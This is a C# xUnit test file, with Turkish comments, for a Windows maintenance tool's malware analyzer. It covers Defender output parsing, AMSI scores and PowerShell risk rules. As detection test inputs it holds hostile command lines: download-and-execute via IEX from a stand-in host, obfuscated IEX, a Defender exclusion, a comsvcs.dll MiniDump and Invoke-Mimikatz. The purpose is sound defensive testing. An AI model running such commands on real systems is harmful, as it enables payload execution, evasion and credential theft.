using System.Linq;
using Bakım.Core.Analyzer;
using Xunit;

namespace Bakim.Core.Tests;

/// <summary>Analizör v3 Faz 3: Defender çıktısı, AMSI sonucu ve betik kuralları.</summary>
public class AnalyzerFaz3Tests
{
    private const string Clean = "Scan starting...\r\nScan finished.\r\nScanning C:\\Tools\\app.exe found no threats.\r\n";

    private const string Eicar = @"Scan starting...
Scan finished.
Scanning C:\Users\u\Downloads\eicar.com found 1 threats.

<===========================LIST OF DETECTED THREATS==========================>
----------------------------- Threat information ------------------------------
Threat                  : Virus:DOS/EICAR_Test_File
Resources               : 1 total
    file                : C:\Users\u\Downloads\eicar.com
-------------------------------------------------------------------------------";

    [Fact]
    public void Defender_Clean_OnlyWhenScanActuallyRan()
    {
        Assert.Equal(DefenderScanState.Clean, DefenderOutput.Parse(Clean, 0).State);

        // Defender kapalıyken MpCmdRun çıktısız ve 0 koduyla döner: bu "temiz" DEĞİLDİR.
        Assert.Equal(DefenderScanState.Unavailable, DefenderOutput.Parse(string.Empty, 0).State);
        // Hizmet çalışmıyor: çıkış kodu 2 olsa bile tehdit değil, "alınamadı".
        Assert.Equal(DefenderScanState.Unavailable, DefenderOutput.Parse("CmdTool: Failed with hr = 0x800106BA. Check MpCmdRun.log", 2).State);
        Assert.Equal(DefenderScanState.Failed, DefenderOutput.Parse("CmdTool: Failed with hr = 0x80070005.", 2).State);
        Assert.Equal(DefenderScanState.Failed, DefenderOutput.Parse("beklenmeyen çıktı", 5).State);
    }

    [Fact]
    public void Defender_ThreatNames_AreParsed()
    {
        var result = DefenderOutput.Parse(Eicar, 2);
        Assert.Equal(DefenderScanState.ThreatFound, result.State);
        Assert.Equal(new[] { "Virus:DOS/EICAR_Test_File" }, result.Threats);

        // Çıkış kodu 2 ama ad yok: yine tehdit.
        Assert.Equal(DefenderScanState.ThreatFound, DefenderOutput.Parse("Scan finished.", 2).State);
    }

    [Theory]
    [InlineData(0, false)]
    [InlineData(1, false)]
    [InlineData(16384, false)]
    [InlineData(32768, true)]
    [InlineData(40000, true)]
    public void Amsi_Result(int value, bool malware) => Assert.Equal(malware, AmsiResult.IsMalware(value));

    [Fact]
    public void Script_DownloadAndExecute_IsCritical()
    {
        var f = ScriptRules.Analyze("$c = (New-Object Net.WebClient).DownloadString('http://x.example/a'); IEX $c");
        Assert.Contains(f, x => x.Title == "İndir ve çalıştır" && x.Critical);
        Assert.True(ScriptRules.TotalImpact(f) >= 35);
    }

    [Fact]
    public void Script_ObfuscatedAliases_AreNormalized()
    {
        // Ters tırnak ve dize birleştirme ile gizlenmiş "IEX" + indirme.
        var f = ScriptRules.Analyze("I`E`X ((New-Object Net.WebClient).('Download'+'String')('http://x.example/p'))");
        Assert.Contains(f, x => x.Title == "İndir ve çalıştır");

        var irm = ScriptRules.Analyze("irm https://x.example/p.ps1 | iex");
        Assert.Contains(irm, x => x.Title == "İndir ve çalıştır");
    }

    [Fact]
    public void Script_BenignInstallerAndWords_AreLowRisk()
    {
        // "confirm" içindeki "irm", "execute" geçen yorum satırı vb. yanlış alarm üretmemeli.
        var benign = ScriptRules.Analyze("# Kurulum betiği\r\n$confirm = Read-Host 'Devam?'\r\nCopy-Item .\\app.exe $env:ProgramFiles\\App\r\nWrite-Host 'Tamam'");
        Assert.Equal(0, ScriptRules.TotalImpact(benign));

        var updater = ScriptRules.Analyze("Invoke-WebRequest https://example.org/app.zip -OutFile app.zip; Expand-Archive app.zip");
        Assert.True(ScriptRules.TotalImpact(updater) <= 5);
    }

    [Fact]
    public void Script_EvasionAndCredentialTheft_AreCritical()
    {
        Assert.Contains(ScriptRules.Analyze("Add-MpPreference -ExclusionPath C:\\Users\\Public"), x => x.Critical);
        Assert.Contains(ScriptRules.Analyze("rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\t\\l.dmp full"), x => x.Critical);
        Assert.Contains(ScriptRules.Analyze("Invoke-Mimikatz -DumpCreds"), x => x.Title.Contains("Kimlik"));
    }

    [Fact]
    public void Script_Obfuscation_And_Encoding()
    {
        string chars = string.Join("+", Enumerable.Range(0, 12).Select(i => $"[char]{65 + i}"));
        Assert.Contains(ScriptRules.Analyze($"$x = {chars}"), x => x.Title == "Karartılmış kod");
        Assert.Contains(ScriptRules.Analyze("[System.Convert]::FromBase64String($p)"), x => x.Title.Contains("base64"));
        Assert.Empty(ScriptRules.Analyze(null));
        Assert.Empty(ScriptRules.Analyze("   "));
    }

    [Fact]
    public void Script_TotalImpact_IsCapped()
    {
        var many = ScriptRules.Analyze("Invoke-Mimikatz; Add-MpPreference -ExclusionPath C:\\; (New-Object Net.WebClient).DownloadString('http://x'); IEX $a; schtasks /create /tn x");
        Assert.Equal(70, ScriptRules.TotalImpact(many));
    }
}

public class ExecutableContentTests
{
    [Theory]
    [InlineData("notlar.txt", false)]
    [InlineData("foto.jpg", false)]
    [InlineData("rapor.pdf", false)]
    [InlineData("kurulum.exe", true)]
    [InlineData("paket.MSI", true)]
    [InlineData("betik.ps1", true)]
    [InlineData("kisayol.lnk", true)]
    [InlineData("uzantisiz", false)]
    public void ByExtension(string name, bool expected) =>
        Assert.Equal(expected, Bakım.Core.Analyzer.ExecutableContent.IsCodeLike(name, ReadOnlySpan<byte>.Empty));

    [Fact]
    public void MzHeader_WinsOverExtension() =>
        Assert.True(Bakım.Core.Analyzer.ExecutableContent.IsCodeLike("masum.txt", new byte[] { (byte)'M', (byte)'Z' }));
}
